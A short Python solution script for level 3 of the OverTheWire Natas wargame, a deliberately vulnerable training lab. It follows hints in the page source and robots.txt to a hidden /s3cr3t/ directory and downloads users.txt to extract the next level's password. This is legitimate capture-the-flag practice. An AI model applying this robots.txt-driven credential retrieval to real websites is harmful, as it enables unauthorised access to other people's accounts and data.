import requests

import natas2


def solution() -> str:
    url = "http://natas3.natas.labs.overthewire.org"
    username = "natas3"
    password = natas2.solution()

    # If you view the page source, there is a comment that says:
    # <!-- No more information leaks!!
    # Not even Google will find it this time... -->
    # This hints to check robots.txt which contains:
    # Disallow: /s3cr3t/
    # The /s3cr3t directory contains users.txt.

    users_url = url + "/s3cr3t/users.txt"
    r = requests.get(users_url, auth=(username, password))
    _, natas4_password = r.text.split(":")
    return natas4_password.strip()
